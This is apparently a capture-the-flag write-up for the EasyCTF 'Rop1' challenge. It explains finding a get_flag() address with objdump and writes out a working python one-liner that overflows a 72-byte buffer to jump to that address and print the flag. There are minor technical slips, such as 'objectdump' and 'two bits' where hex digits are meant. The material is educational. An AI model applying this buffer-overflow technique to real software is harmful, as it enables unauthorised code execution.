# Rop1

By PGODULTIMATE

```asciidoc
Go to /problems/rop1 on the shell server and tell me whats in flag.txt.
```

Well the first step to solving this problem is simply accessing the shell and **cd** to `/problems/rop1`. If you `ls -a` the directory then two files would immediately show up. They are Rop1 and [Rop1.c](https://github.com/goelp14/EasyCTF-Writeups-2018-Final/blob/master/rop1.c). I am not linking to the other file because it isn't really necessary and I cannot find it. Anyway, looking at Rop1.c, I see that there is a:

```c
void get_flag()
{
        system("/bin/cat flag.txt");
}
```

That is just completely separate from the other segments of code so I know I can't get to it through normal means. This function prints out the flag as cat is an opening command and flag.txt is - you know - the flag. So I know that this is the part of the code I need to attack. What I do next is objdump the program.

```asciidoc
$ objectdump -d rop1
```

This gives me a whole bunch of stuff, but all I need to look for is the get\_flag\(\) function. It would literally say get\_flag next to the address of the function. So, my address is:

```py
0x0000000000400646
```

What does this mean? Well it really is just telling me the location of the function in the program. With this, I can send a **Buffer Overflow** attack to it and it should print out the flag \(since this is a ROP problem\). Now I just need to figure out what the buffer size is! I first just tried _64 characters_ \(or _64 bytes_\) because thats the usual size for a buffer. Before I go any further I should explain a little but about a **Buffer Overflow** attack. Essentially, this exploits a function that takes an input by putting more characters than can be handled. However, the amount usually has to be precise \(I believe 8 bytes over but that may vary\). The common format of the attack would be:

```py
$ python -c "print('A' * <buffer overflow size> + '\xmemory\xaddress\xto\xexploit')" | ./<file>
```

It would directly pump in the letter **A ** the number of times I want it to to reach the **buffer overflow size **as an answer to whatever input is wanted at that memory address. The address we found must be converted to **Little Endian** to be used as a memory address in this attack. **Little Endian **is really just the memory address found split in to segments of two bits and then reversed. In this case, The  **Little Endian  **of `0x0000000000400646` is simply `\x46\x06\x40\x00\x00\x00\x00\x00`. In this first scenario it would look like this:

```py
$ python -c "print('A' * 64 + '\x46\x06\x40\x00\x00\x00\x00\x00')" | ./rop1
```

This didn't print out my flag but I did get a `Segmentation fault (core dumped)` meaning that I am on the right track. So, I just added _eight bytes_ to it \(_64 bits or 8 characters_\).

```py
$ python -c "print('A' * 72 + '\x46\x06\x40\x00\x00\x00\x00\x00')" | ./rop1
```

This prints out my flag:

```asciidoc
easyctf{r0ps_and_h0ps}
```



